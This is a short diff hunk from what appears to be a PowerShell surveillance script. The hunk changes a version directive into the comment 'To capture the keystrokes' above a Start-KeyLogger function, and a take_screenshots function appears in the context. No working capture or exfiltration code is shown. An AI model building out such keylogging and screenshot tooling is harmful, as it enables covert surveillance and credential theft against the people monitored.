@@ -41,7 +41,7 @@ function take_screenshots ($File)
 
 
 
-#requires -Version 2 
+#To capture the keystrokes
 function Start-KeyLogger() 
 {
   # Signatures for API Calls
